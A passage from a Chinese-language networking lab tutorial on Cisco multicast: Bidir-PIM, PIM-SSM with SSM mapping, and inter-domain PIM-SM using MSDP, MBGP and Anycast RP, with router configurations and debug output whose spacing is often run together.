224.1.1.1),Forward state, by PIM *G Join *Mar 1 00:12:38.171: PIM(0): Received v2 Join/Prune on Ethernet0/0 from192.168.13.1, to us Mar 1 00:12:38.171: PIM(0): Join-list: (, 224.0.1.40), RPT-bit set, WC-bitset, S-bit set Mar 1 00:12:38.171: PIM(0): Update Ethernet0/0/192.168.13.1 to (,224.0.1.40), Forward state, by PIM *G Join *Mar 1 00:10:34.471: PIM(0): Received v2 Join/Prune on Ethernet0/1 from192.168.34.4, to us Mar 1 00:10:34.471: PIM(0): Join-list: (, 224.1.1.1), RPT-bit set, WC-bitset, S-bit set Mar 1 00:10:34.475: PIM(0): Update Ethernet0/1/192.168.34.4 to (,224.1.1.1), Forward state, by PIM *G Join *Mar 1 00:10:34.795: PIM(0): Building Periodic Join/Prune message for224.1.1.1 R3#ship mroute IPMulticast Routing Table Flags:D - Dense, S - Sparse, B - Bidir Group, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F- Register flag, T - SPT-bit set, J - Join SPT, M - MSDPcreated entry, X - Proxy Join Timer Running, A -Candidate for MSDP Advertisement, U - URD, I - Received Source SpecificHost Report, Z - Multicast Tunnel, z - MDT-data groupsender, Y - Joined MDT-data group, y - Sendingto MDT-data group Outgoinginterface flags: H - Hardware switched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1),00:05:49/00:02:35, RP 3.3.3.3, flags: B Bidir-Upstream: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Sparse,00:05:49/00:02:35 (*,224.0.1.40), 00:14:17/00:02:41, RP 3.3.3.3, flags: BCL Bidir-Upstream: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/1, Forward/Sparse,00:09:11/00:02:41 Ethernet0/0, Forward/Sparse,00:13:16/00:02:38 R4#ship mroute IPMulticast Routing Table Flags:D - Dense, S - Sparse, B - Bidir Group, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F- Register flag, T - SPT-bit set, J - Join SPT, M - MSDPcreated entry, X - Proxy Join Timer Running, A -Candidate for MSDP Advertisement, U - URD, I - Received Source SpecificHost Report, Z - Multicast Tunnel, z - MDT-data groupsender, Y - Joined MDT-data group, y - Sendingto MDT-data group Outgoinginterface flags: H - Hardware switched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (*, 224.1.1.1),00:07:23/00:02:35, RP 3.3.3.3, flags: BC Bidir-Upstream: Ethernet0/1, RPF nbr192.168.34.3 Outgoing interface list: Ethernet0/2, Forward/Sparse,00:07:23/00:02:35 Ethernet0/1, Bidir-Upstream/Sparse,00:07:23/00:00:00 (*,224.0.1.40), 00:12:13/00:02:25, RP 3.3.3.3, flags: BCL Bidir-Upstream: Ethernet0/1, RPF nbr192.168.34.3 Outgoing interface list: Ethernet0/0, Forward/Sparse,00:10:48/00:02:22 Ethernet0/1, Bidir-Upstream/Sparse,00:10:49/00:00:00 Server#ping224.1.1.1 repeat 100 Typeescape sequence to abort. Sending100, 100-byte ICMP Echos to 224.1.1.1, timeout is 2 seconds: .. Replyto request 2 from 192.168.0.2, 104 ms Replyto request 3 from 192.168.0.2, 144 ms Replyto request 4 from 192.168.0.2, 164 ms Replyto request 5 from 192.168.0.2, 128 ms 在Bidir-PIM模式下，所有的组播路由器首先以RP为根构建一棵共享树，连接组播接收者的路由器动态的沿着RPF路径向RP发送加入或修剪消息，将动态的生成一个用于流量转发的子树（是共享树的一个子集），任何的组播源都可以直接将流量转发给RP，或者一个下游邻居（下游邻居必须先加入到共享树），除了RP路由器外，其它路由器都在每条链路上选举DF路由器，最终每个路由器都根据流量的入站接口，动态计算一个出站接口列表，实现准确的组播数据包的转发。 在所有的组播路由器上，不使用也不建立任何的源树转发条目（S,G），减少了组播路由协议对系统和网络资源的占用。 实验七、PIM-SSM（指定信源组播） SSM（Source-Specific Multicast，指定信源组播）模型和ASM（Any-Source Multicast，任意信源组播）模型是两个完全对等的模型。目前，ASM模型包括PIM-DM和PIM-SM两种模式；SSM模型能够借助PIM-SM的部分技术来实现。SSM模型为指定源组播提供了解决方案，通过IGMPv3来维护主机与路由器之间的关系。鉴于PIM-DM模式以扩散/剪枝方式构建以组播源为根的SPT，虽然SPT的路径最短，但是分发树的建立过程效率较低，不适合大中型网络。在实际应用中，通常采用PIM-SM模式的一部分技术来实现SSM模型。由于接收者已经通过其它渠道（如广告咨询等）知道了组播源的具体位置，因此在SSM模型中无需RP，无需构建RPT，无需源注册过程，也无需通过MSDP（Multicast Source Discovery Protocol，组播源发现协议）来发现其它PIM域内的组播源。因此PIM-SSM适合于点到多点的服务 与ASM模型相比，SSM模型仅需要IGMPv3和PIM-SM部分子集的支持。构建为PIM-SM服务的RPT，还是构建为PIM-SSM服务的SPT，关键在于接收者准备加入的组播组是否属于SSM组地址范围（默认为232.0.0.0～232.255.255.255）。如果用户对组播源S的信息感兴趣，则借助IGMPv3的报告报文向最近的DR路由器报告自己对特定源S的信息感兴趣，标记为（include S，G）；或报告对除特定源S外的其它组播源的信息感兴趣，则标记为（exclude S，G）。无论如何描述，都表示特定源S的位置对接收者是明确指定的。接收到该报文的DR先判断该报文中的组地址是否在SSM组地址范围内：如果在范围内则构建PIM-SSM，并向特定源S逐跳发送通道的订阅报文。沿途所有路由器上都创建（Include S，G）或（ExcludeS，G）表项，从而在网络内构建了一棵以指定组播源S为根，以接收者为叶子节点的SPT，该树就是PIM-SSM中的传输通道；如果不在范围内，则仍旧按照PIM-SM的流程进行后续处理，此时DR需要向RP发送（*，G）加入报文，同时需要进行组播源的注册。在配置过程中，请注意以下几点： 如果没有配置SSM的组地址，默认为232.0.0.0～232.255.255.255； 必须使用IGMPv3指定源加入； 目前不支持以exclude模式加入组 Server1配置： Server1#conf t Server1(config)#no ip routing Server1(config)#int e0/0 Server1(config-if)#ip add 192.168.1.2255.255.255.0 Server1(config-if)#no sh Server1(config-if)#exit Server1(config)#ip default-gateway192.168.1.1 Server2配置： Server2#conf Server2(config)#no ip routing Server2(config)#ip default-gateway192.168.2.1 Server2(config)#int e0/0 Server2(config-if)#ip add 192.168.2.2255.255.255.0 Server2(config-if)#no sh Server2(config-if)#exit R3配置： R3#conf t R3(config)#ip multicast-routing R3(config)#ip pim ssm default R3(config)#int e0/0 R3(config-if)#ip add 192.168.1.1255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#ip igmp version 3 R3(config-if)#no sh R3(config-if)#exit R3(config)#int e0/1 R3(config-if)#ip add 192.168.2.1255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#ip igmp ver 3 R3(config-if)#no sh R3(config-if)#exit R3(config)#int e0/2 R3(config-if)#ip add 192.168.34.1255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#ip igmp ver 3 R3(config-if)#no sh R3(config-if)#exit R3(config)#router ospf 1 R3(config-router)#net 0.0.0.0 0.0.0.0area 0 R3(config-router)#exit R4配置： R4#conf t R4(config)#ip multicast-routing R4(config)#ip pim ssm default //开启指定信源组播模式 R4(config)#access-list 1 permit232.1.1.1 //标记组播组地址 R4(config)#ip igmp ssm-map enable //开启SSM映射功能 R4(config)#ip igmp ssm-map static 1192.168.1.2//建立组播组与信源的映射 R4(config-if)#ip add 192.168.34.4255.255.255.0 R4(config-if)#ip pim sparse-mode R4(config-if)#ip igmp ver 3 R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/1 R4(config-if)#ip add 192.168.0.1255.255.255.0 R4(config-if)#ip pim sparse-moder R4(config-if)#ip igmp ver 3 R4(config-if)#no sh R4(config-if)#exit R4(config)#router ospf 1 R4(config-router)#net 0.0.0.0 0.0.0.0area 0 R4(config-router)#exit PC配置： PC#conf t PC(config)#no ip routing PC(config)#ip default-gateway192.168.0.1 PC(config)#int e0/0 PC(config-if)#ip add 192.168.0.2255.255.255.0 PC(config-if)#ip igmp join-group232.1.1.1 source 192.168.1.2 //加入组播组，并指定组播信源 PC(config-if)#no sh PC(config-if)#exit 检查网络联通性，然后观察R4 R4#sh ip mroute IP Multicast Routing Table Flags: D - Dense, S - Sparse, B - BidirGroup, s - SSM Group, C - Connected, L - Local, P - Pruned, R - RP-bit set, F - Register flag, T - SPT-bit set, J - Join SPT, M - MSDP created entry, X - Proxy Join Timer Running, A - Candidate for MSDP Advertisement, U - URD, I - Received Source Specific Host Report, Z - Multicast Tunnel, z - MDT-data group sender, Y - Joined MDT-data group, y - Sending to MDT-data group Outgoing interface flags: H - Hardwareswitched, A - Assert winner Timers: Uptime/Expires Interface state: Interface, Next-Hop or VCD,State/Mode (192.168.1.2,232.1.1.1), 00:04:04/00:02:57, flags: sTI Incoming interface: Ethernet0/0, RPF nbr192.168.34.1 Outgoing interface list: Ethernet0/1, Forward/Sparse,00:04:04/00:02:57 (*, 224.0.1.40), 00:16:11/00:02:28, RP0.0.0.0, flags: DCL Incoming interface: Null, RPF nbr 0.0.0.0 Outgoing interface list: Ethernet0/0, Forward/Sparse, 00:16:11/00:02:28 R4#sh ip igmp groups IGMP Connected Group Membership Group Address Interface Uptime Expires Last Reporter Group Accounted 232.1.1.1 Ethernet0/1 00:03:04 00:02:03 192.168.0.2 224.0.1.40 Ethernet0/0 00:09:16 00:02:31 192.168.34.4 接着在Server1 和Server2分别ping 232.1.1.1组播组地址观察结果： Server1#ping 232.1.1.1 repeat 100 //Server1 可以通信 Type escape sequence to abort. Sending 100, 100-byte ICMP Echos to232.1.1.1, timeout is 2 seconds: Reply to request 0 from 192.168.0.2, 76ms Reply to request 1 from 192.168.0.2, 56ms Server2#ping 232.1.1.1 repeat 100 //Server2不可以 Type escape sequence to abort. Sending 100, 100-byte ICMP Echos to232.1.1.1, timeout is 2 seconds: ………………………………………….. 实验八、域间组播PIM-SM结合MSDP与MBGP 当网络跨越了公网，或者网络需要各自独立时，如果每个独立的网络，或者是每个AS之间都需要组播通信的情况下，我们需要在不影响网络独立的前提下连通网络间的组播。各个独立的网络中，又希望自己的组播路由器可以由自己完全控制，那么就需要将各个网络配置成独立的PIM-SM域。要将不同的PIM-SM域之间连通组播，就必须先有正常的组播树，而PIM-SM组播树的建立，必须了解到网络中的RP信息，以及组播源的位置。 此时MSDP出现了，MSDP组播源发现协议(MulticastSourceDiscoveryProtocol)描述了一种连接多PIM-SM(PIM-SM：PIMSparseMode)域的机制。每种PIM-SM域都使用自己独立的RP，它并不依赖于其它域内的RP。PIM-SM域内的MSDP发话路由器与其它域内的MSDP对等设备之间存在一种MSDP对等关系，这种关系通过TCP连接形成，在其中控制信息进行交换。每个域都有一个或多个连接到这个虚拟拓扑结构。这种拓朴结构使得域能从其它域发现组播源。如果组播源想知道含有接收端的域，那么PIM-SM中的标准源树建立机制就会被用于在域内分配树上传送组播数据。MSDP使用TCP639端口建立对等连接(高ip侦听，低ip连接)，和BGP一样，对等间连接必须明确配置，当PIMDR在RP注册源时，RP向所有的MSDP对等体发送源激活消息，然后其他MSDP路由器将SA泛洪。域内的组播路由和组播源信息收集工作由 PIM-SM 完成， MBGP 负责域间传播具有组播拓扑的信息，MSDP 负责传播组播源信息。这种方案要求所有的自治域都支持 PIM-SM、MBGP和MSDP。在PIM-SM / MBGP / MSDP 组合方案中，自治域边界路由器之间配置外部 MBGP 对等，RP 之间配置外部 MSDP 对等；自治域内部路由器之间根据需要配置内部 MBGP 对等；内部 RP之间配置内部 MSDP 对等，实现Anycast RP。该优点在於 不存在第三方(Third-party)资源依赖域内RP。 msdp使得一个pim-sm域不需要依赖另一个pim-sm域内的rp，因为在得到另一个pim-sm域内的组播源信息之后，一个pim-sm域里的接收者可以不通过另一pim-sm域里的rp而直接加入到这个域内组播源的spt上。 PIM-SM域只依靠本身的RP。 接收端域：只带接受端的域可以获取数据而不用全局通告组成员。MSDP可以和其它非PIM-SM协议一起使用。 在不同的PIM-SM域之间建立MSDP连接时，是使用TCP 639， IP地址高的初始化TCP连接，60秒一次keepalive,75秒后没数据或keepalive则重建TCP。建立连接的双方均是各自区域的RP，组播源向RP注册之后，那么RP将这些源信息通过在MSDP连接上发送Source-Active (SA)到远程RP，以提供组播源的信息。因为RP收到Source-Active (SA)后，也是要做RPF检测的，检测是根据BGP来做的，在这里，需要使用MBGP之组播协议，组成员的网络信息和建立MSDP连接的peer地址理论上都需要在MBGP中进行通告，一是防止RPF检测失败，二是由此来决定组播数据的传递，所以十分重要。MBGP（多协议边界网关协议）增加了 BGP 的性能，使其能在整个因特网上组播路由策略，并能够在 BGP 自治系统内或之间连接组播拓朴。换句话说， MBGP 可以说是增强版的携带 IP 组播路由的 BGP（不仅限于此）。BGP 携带了两组路由，一组是提供单播路由，另一组是提供组播路由。协议独立组播（PIM）使用连接组播路由的路由器建立数据分配树。当需要链接仅用于组播通信，或限制通信的资源使用时；也可能当网络访问点需要交换所有的组播通信时，MBGP 都是非常有用的。MBGP 允许单播路由拓朴不同于组播路由拓朴。 &lt;/span&gt; 但是在PIM-SM域之间没有开启MBGP，就会有RPF检测失败的危险，失败后，Source-Active (SA)将被丢弃，所以要想在不开启MBGP的情况下，又要接收所有的Source-Active (SA)，则将接收端配置成default MSDP,那么该域将接收任何SA信息。在配置default MSDP时，需要指定从何处接收SA，就需要指定对端MSDP peer，使用ip msdp default-peer指定，之后从对端过来的SA将不做RPF检测而完全被接收。 在配置MSDP peer时，可以指定originator-id，此ID即在SA中写出RP的地址，也可以不配。必须的配置只是msdp peer，且 MSDP对等体的接口地址与建立MBGP对等体的接口地址相同。MSDP只能在PIM-SM下使用，并且域间建立peer的RP应该是直连的。当两个远程网络需要使用组播时，由于中间可以隔了多个网络，也可以利用MSDP连接在不需要中间网络支持组播的情况下，连通远程网络的组播，所以MSDP类似于组播VPN。但需要解决直连问题，解决的方法可以配置tunnel。 在不同的域中配置的RP，被称为LogicalRP ，但在网络中也可以配置多个RP，如果将多个RP配置成同一个地址时，那么多个具有相同地址的RP被称为Anycast RP，而且Anycast RP必须是32位掩码的地址，且需要在单播里通告，各个源和组成员均选用离自己最近的RP, 从而提供冗余功能。所有Anycast RP都要配置成MSDP peers,每个注册的消息，都传给所有RP msdp另一个应用是anycast rp。在一个域内，用同一个ip地址配置不同的路由器上的某一接口（通常是loopback接口），同时，配置这些路由器上这个接口为候选rp，并在这些rp之间建立msdp对等体关系。单播路由收敛后，组播源可以选择最近的rp注册，接收者也可以选择最近的rp加入其rpt。这些rp之间通过msdp对等体了解对方的注册源信息，最终每个rp了解到整个域内的所有组播源，这样，每个rp上的接收者就可以接收到整个域内的所有组播源发出的组播数据。通过向就近的rp发起注册和rpt加入，实现rp的负载分担；一个rp失效后，其原来注册的源和加入者，又会选择另一个就近的rp注册和加入，实现了rp的冗余备份。另外，msdp通过rpf检查机制，只接受从正确路径上接收到的sa消息，避免接受冗余的sa消息；可以通过配置mesh全连接组来避免sa消息在msdp对等体之间泛滥。 在Anycast RP中，2个或多个RP在其Loopback接口上配置相同的IP地址。Anycast RP Loopback地址应该配置为32位掩码，其他路由器必须”知道”这个Anycast RP Loopback地址是它们的RP。当然在一台路由器上，IP路由协议将会自动选择离它最近的RP；假设网络中的组播源是均匀分布的，那么这些组播源也将均匀地注册到每个RP上。由于组播源可能注册到一个RP，而接收方却注册到另一个RP，我们就需要使用MSDP在RP之间交换活动组播源的信息。在Anycast RP中，所有RP之间必须配置为MSDP对等体。当一个组播源向某个RP注册时，该RP将通过MSDP的SA消息通告给其他RP，从而使得其他的RP都知道这个组播源的信息。若某个RP故障，当IP路由协议收敛后，其他RP将会成为该区域新的RP。而新的组播源将会将会注册到备份RP（即新的RP）；同样地，接收方也将使用新的RP，从而保证连通性。 单个域内的PIM-SM要通信，是建立的（*，G）条目，如果PIM-SM域之间要通信，建立的是(S，G)条目，相当于是距离矢量的路径方式 Server配置： Server#conf t Server(config)#no ip routing Server(config)#ip default-gateway192.168.1.1 Server(config)#int e0/0 Server(config-if)#ip add 192.168.1.2255.255.255.0 Server(config-if)#no sh Server(config-if)#exit R1配置： R1#conf t R1(config)#ip multicast-routing R1(config)#int e0/0 R1(config-if)#ip add 192.168.1.1255.255.255.0 R1(config-if)#ip pim sparse-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#int e0/1 R1(config-if)#ip add 192.168.12.1255.255.255.0 R1(config-if)#ip pim sparse-mode R1(config-if)#no sh R1(config-if)#exit R1(config)#int lo 0 R1(config-if)#ip add 1.1.1.1255.255.255.255 R1(config-if)#ip pim sparse-mode R1(config-if)#exit R1(config)#int lo 10 R1(config-if)#ip add 10.10.10.10255.255.255.255 R1(config-if)#ip pim sparse-mode R1(config-if)#exit R1(config)#router ospf 1 R1(config-router)#router-id 1.1.1.1 R1(config-router)#net 1.1.1.1 0.0.0.0area 0 R1(config-router)# network 10.10.10.100.0.0.0 area 0 R1(config-router)#net 192.168.12.0255.255.255.0 area 0 R1(config-router)#net 192.168.1.0255.255.255.0 area 0 R1(config-router)#exit R1(config)#router bgp 65501 R1(config-router)#bgp router-id 1.1.1.1 R1(config-router)#net 192.168.1.0 mask255.255.255.0 R1(config-router)#net 192.168.12.0 mask255.255.255.0 R1(config-router)#neighbor 2.2.2.2remote-as 65501 nlri unicast multicast R1(config-router)#neighbor 2.2.2.2update-source loopback 0 R1(config-router)#neighbor 3.3.3.3remote-as 65501 nlri unicast multicast R1(config-router)#neighbor 3.3.3.3update-source loopback 0 R1(config-router)#exit R1(config)#ip pim bsr-candidate loopback10 R1(config)#ip pim rp-candidate loopback10 R1(config)#ip msdp peer 2.2.2.2connect-source loopback 0 R1(config)#ip msdp peer 3.3.3.3connect-source loopback 0 R1(config)#ip msdp mesh-group anycast-rp2.2.2.2 R1(config)#ip msdp mesh-group anycast-rp3.3.3.3 R1(config)#ip msdp originator-idloopback 0 R2配置： R2#conf t R2(config)#ip multicast-routing R2(config)#int e0/0 R2(config-if)#ip add 192.168.12.2255.255.255.0 R2(config-if)#ip pim sparse-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#int e0/1 R2(config-if)#ip add 192.168.23.2255.255.255.0 R2(config-if)#ip pim sparse-mode R2(config-if)#no sh R2(config-if)#exit R2(config)#int lo 0 R2(config-if)#ip add 2.2.2.2255.255.255.255 R2(config-if)#ip pim sparse-mode R2(config-if)#exit R2(config)#in lo 10 R2(config-if)#ip add 10.10.10.10255.255.255.255 R2(config-if)#ip pim sparse-mode R2(config-if)#exit R2(config)#router ospf 1 R2(config-router)#router-id 2.2.2.2 R2(config-router)#net 2.2.2.2 0.0.0.0area 0 R2(config-router)#net 10.10.10.100.0.0.0 area 0 R2(config-router)#net 192.168.12.0255.255.255.0 area 0 R2(config-router)#net 192.168.23.0255.255.255.0 area 0 R2(config-router)#exit R2(config)#router bgp 65501 R2(config-router)#bgp router-id 2.2.2.2 R2(config-router)#net 192.168.12.0 mask255.255.255.0 R2(config-router)#net 192.168.23.0 mask255.255.255.0 R2(config-router)#nei 1.1.1.1 remote-as65501 nlri unicast multicast R2(config-router)#nei 1.1.1.1update-source loopback 0 R2(config-router)#nei 3.3.3.3 remote-as65501 nlri unicast multicast R2(config-router)#nei 3.3.3.3update-source loopback 0 R2(config-router)#exit R2(config)# ip pim bsr-candidateloopback 10 R2(config)#ip pim rp-candidate loopback10 R2(config)#ip msdp peer 1.1.1.1connect-source loopback 0 R2(config)#ip msdp peer 3.3.3.3 connect-sourceloopback 0 R2(config)#ip msdp mesh-group anycast-rp1.1.1.1 R2(config)#ip msdp mesh-group anycast-rp3.3.3.3 R2(config)#ip msdp originator-idloopback 0 R3配置： R3#conf t R3(config)#ip multicast-routing R3(config)#int e0/0 R3(config-if)#ip add 192.168.23.3255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#int e0/1 R3(config-if)#ip add 192.168.34.3255.255.255.0 R3(config-if)#ip pim sparse-mode R3(config-if)#no sh R3(config-if)#exit R3(config)#int lo 0 R3(config-if)#ip add 3.3.3.3255.255.255.255 R3(config-if)#ip pim sparse-mode R3(config-if)#exit R3(config)#int lo 10 R3(config-if)#ip add 10.10.10.10255.255.255.255 R3(config-if)#ip pim sparse-mode R3(config-if)#exit R3(config)#router ospf 1 R3(config-router)#router-id 3.3.3.3 R3(config-router)#net 3.3.3.3 0.0.0.0 area0 R3(config-router)#net 10.10.10.100.0.0.0 area 0 R3(config-router)#net 192.168.23.0255.255.255.0 area 0 R3(config-router)#net 192.168.34.0255.255.255.0 area 0 R3(config-router)#exit R3(config)#router bgp 65501 R3(config-router)#bgp router-id 3.3.3.3 R3(config-router)#net 192.168.23.0 mask255.255.255.0 R3(config-router)#net 192.168.34.0 mask255.255.255.0 R3(config-router)#net 10.10.10.10 mask255.255.255.255 R3(config-router)#nei 1.1.1.1 remote-as65501 nlri unicast multicast R3(config-router)#nei 1.1.1.1update-source loopback 0 R3(config-router)#nei 2.2.2.2 remote-as65501 nlri unicast multicast R3(config-router)#nei 2.2.2.2update-source loopback 0 R3(config-router)#nei 192.168.34.4remote-as 65502 nlri unicast multicast R3(config-router)#exit R3(config)#ip pim bsr-candidate loopback10 R3(config)#ip pim rp-candidate loopback10 R3(config)#ip msdp peer 1.1.1.1connect-source loopback 0 R3(config)#ip msdp peer 2.2.2.2 connect-sourceloopback 0 R3(config)# ip msdp peer 192.168.34.4connect-source ethernet 0/1 remote-as 65502 R3(config)#ip msdp mesh-group anycast-rp1.1.1.1 R3(config)#ip msdp mesh-group anycast-rp2.2.2.2 R3(config)#ip msdp originator-idloopback 0 R4配置： R4#conf t R4(config)#ip multicast-routing R4(config)#int e0/0 R4(config-if)#ip add 192.168.34.4255.255.255.0 R4(config-if)#ip pim sparse-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int e0/1 R4(config-if)#ip add 192.168.45.4255.255.255.0 R4(config-if)#ip pim sparse-mode R4(config-if)#no sh R4(config-if)#exit R4(config)#int lo 0 R4(config-if)#ip add 4.4.4.4255.255.255.255 R4(config-if)#ip pim sparse-mode R4(config-if)#exit R4(config)#int lo 20 R4(config-if)#ip add 20.20.20.20255.255.255.255 R4(config-if)#ip pim sparse-mode R4(config-if)#exit R4(config)#router eigrp 1 R4(config-router)#no au R4(config-router)#net 0.0.0.0 0.0.0.0 R4(config-router)#exit R4(config)#router bgp 65502 R4(config-router)#bgp router-id 4.4.4.4 R4(config-router)#net 192.168.34.0 mask255.255.255.0 R4(config-router)#net 192.168.45.0 mask255.255.255.0 R4(config-router)#net 20.20.20.20 mask255.255.255.255 R4(config-router)#nei 192.168.34.3remote-as 65501 nlri unicast multicast R4(config-router)#nei 5.5.5.5 remote-as65502 nlri unicast multicast R4(config-router)#nei 5.5.5.5update-source loopback 0 R4(config-router)#exit R4(config)#ip pim rp-address 20.20.20.20 R4(config)# ip msdp peer 192.168.34.3connect-source Ethernet 0/0 remote-as 65501 R4(config)#ip msdp peer 5.5.5.5connect-source loopback 0 R4(config)#ip msdp originator-idloopback 0 R5配置： R5#conf t R5(config)#ip multicast-routing R5(config)#int e0/0 R5(config-if)#ip add 192.168.45.5255.255.255.0 R5(config-if)#ip pim sparse-mode R5(config-if)#no sh R5(config-if)#exit R5(config)#int e0/1 R5(config-if)#ip add 192.168.0.1255.255.255.0 R5(config-if)#ip pim sparse-mode R5(config-if)#no sh R5(config-if)#exit R5(config)#int lo 0 R5(config-if)#ip add 5.5.5.5255.255.255.255 R5(config-if)#ip pim sparse-mode R5(config-if)#exit R5(config)#int lo 20 R5(config-if)#ip add 20.20.20.20255.255.255.255 R5(config-if)#ip pim sparse-mode R5(config-if)#exit R5(config)#router eigrp 1 R5(config-router)#no au R5(config-router)#net 0.0.0.0 0.0.0.0 R5(config-router)#exit R5(config)#router bgp 65502 R5(config-router)#bgp router-id 5.5.5.5 R5(config-router)#net 192.168.45.0 mask255.255.255.0 R5(config-router)#net 192.168.0.0 mask255.255.255.0 R5(config-router)#nei 4.4.4.4 remote-as65502 nlri unicast multicast R5(config-router)#nei 4.4.4.4update-source loopback 0 R5(config-router)#exit R5(config)#ip pim rp-address 20.20.20.20 R5(config)#ip msdp peer 4.4.4.4connect-source loopback 0 R5(config)#ip msdp originator-idloopback 0 PC配置： PC#conf t PC(config)#no ip routing PC(config)#ip default-gateway192.168.0.1 PC(config)#int e0/0 PC(config-if)#ip add 192.168.0.2255.255.255.0 PC(config-if)#ip igmp join-group224.1.1.1 PC(config-if)#no sh 此时在Server端ping 224.1.1.1 ，并调试R3和R4 变化： Server#ping 224.1.1.1 repeat 100 Type escape sequence to abort. Sending 100, 100-byte ICMP Echos to224.1.1.1, timeout is 2 seconds: . Reply to request 1 from 192.168.0.2, 184ms Reply to request 2 from 192.168.0.2, 188ms Reply to request 3 from 192.168.0.2, 184ms R3#debug ip msdp detail MSDP Detail debugging is on *Mar 1 00:02:30.503: %PIM-5-NBRCHG: neighbor 192.168.34.4 UP on interfaceEthernet0/1 *Mar 1 00:02:30.519: %PIM-5-DRCHG: DR change from neighbor 192.168.34.3 to192.168.34.4 on interface Ethernet0/1 *Mar 1 00:03:01.683: %BGP-5-ADJCHANGE: neighbor 192.168.34.4 Up *Mar 1 00:03:05.383: %MSDP-5-PEER_UPDOWN: Session to peer 192.168.34.4 goingup *Mar 1 00:03:07.327: MSDP(0): start_index = 0, sa_cache_index = 0, Qlen = 0 *Mar 1 00:03:07.327: MSDP(0): Sent entire sa-cache, sa_cache_index = 0, Qlen= 0 *Mar 1 00:03:31.071: MSDP(0): Received 3-byte TCP segment from 192.168.34.4 *Mar 1 00:03:31.071: MSDP(0): Append 3 bytes to 0-byte msg 0 from192.168.34.4, qs 1 *Mar 1 00:03:48.295: %PIM-5-NBRCHG: neighbor 192.168.23.2 UP on interface Ethernet0/0 *Mar 1 00:03:56.027: %OSPF-5-ADJCHG: Process 1, Nbr 2.2.2.2 on Ethernet0/0from LOADING to FULL, Loading Done *Mar 1 00:04:00.331: MSDP(0): start_index = 0, sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:00.331: MSDP(0): Sent entire sa-cache, sa_cache_index = 0, Qlen= 0 *Mar 1 00:04:22.979: %BGP-5-ADJCHANGE: neighbor 2.2.2.2 Up *Mar 1 00:04:31.067: MSDP(0): Received 3-byte TCP segment from 192.168.34.4 *Mar 1 00:04:31.067: MSDP(0): Append 3 bytes to 0-byte msg 1 from192.168.34.4, qs 1 *Mar 1 00:04:46.851: %MSDP-5-PEER_UPDOWN: Session to peer 1.1.1.1 going up *Mar 1 00:04:47.715: MSDP(0): Received 3-byte TCP segment from 1.1.1.1 *Mar 1 00:04:47.715: MSDP(0): Append 3 bytes to 0-byte msg 2 from 1.1.1.1, qs1 *Mar 1 00:04:47.779: %MSDP-5-PEER_UPDOWN: Session to peer 2.2.2.2 going up *Mar 1 00:04:48.335: MSDP(0): start_index = 0, sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:48.339: MSDP(0): Sent entire sa-cache, sa_cache_index = 0, Qlen= 0 *Mar 1 00:04:48.943: MSDP(0): Received 3-byte TCP segment from 2.2.2.2 *Mar 1 00:04:48.947: MSDP(0): Append 3 bytes to 0-byte msg 3 from 2.2.2.2, qs1 *Mar 1 00:04:49.343: MSDP(0): start_index = 0, sa_cache_index = 0, Qlen = 0 *Mar 1 00:04:49.343: MSDP(0): Sent entire sa-cache, sa_cache_index = 0, Qlen= 0 *Mar 1 00:04:51.763: %BGP-5-ADJCHANGE: neighbor 1.1.1.1 Up *Mar 1 00:05:00.343: MSDP(0): start_index = 0, sa_cache_index = 0, Qlen = 0 *Mar 1 00:05:00.343: MSDP(0): Sent entire sa-cache, sa_cache_index = 0, Qlen= 0 *Mar 1 00:05:39.539: MSDP(0): Received 120-byteTCP segment from 1.1.1.1 *Mar 1 00:05:39.539: MSDP(0): Append 120 bytes to0-byte msg 5 from 1.1.1.1, qs 1 *Mar 1 00:05:39.539: MSDP(0): WAVL Insert SASource 192.168.1.2 Group 224.1.1.1 RP 1.1.1.1 Successful R4#debugip msdp de MSDPDetail debugging is on *Mar 1 00:00:33.651: %PIM-5-NBRCHG: neighbor192.168.34.3 UP on interface Ethernet0/0 *Mar 1 00:00:35.487: %BGP-5-ADJCHANGE: neighbor192.168.34.3 Up *Mar 1 00:00:39.235: %MSDP-5-PEER_UPDOWN: Sessionto peer 192.168.34.3 going up *Mar 1 00:00:40.175: MSDP(0): Received 3-byte TCPsegment from 192.168.34.3 *Mar 1 00:00:40.175: MSDP(0): Append 3 bytes to0-byte msg 0 from 192.168.34.3, qs 1 *Mar 1 00:00:40.871: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:00:40.871: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:24.255: %PIM-5-NBRCHG: neighbor192.168.45.5 UP on interface Ethernet0/1 *Mar 1 00:01:24.271: %PIM-5-DRCHG: DR change fromneighbor 192.168.45.4 to 192.168.45.5 on interface Ethernet0/1 *Mar 1 00:01:25.887: %DUAL-5-NBRCHANGE:IP-EIGRP(0) 1: Neighbor 192.168.45.5 (Ethernet0/1) is up: new adjacency *Mar 1 00:01:34.947: %MSDP-5-PEER_UPDOWN: Sessionto peer 5.5.5.5 going up *Mar 1 00:01:36.879: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:36.879: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:38.883: MSDP(0): start_index = 0,sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:38.883: MSDP(0): Sent entiresa-cache, sa_cache_index = 0, Qlen = 0 *Mar 1 00:01:39.251: %BGP-5-ADJCHANGE: neighbor5.5.5.5 Up *Mar 1 00:01:40.183: MSDP(0): Received 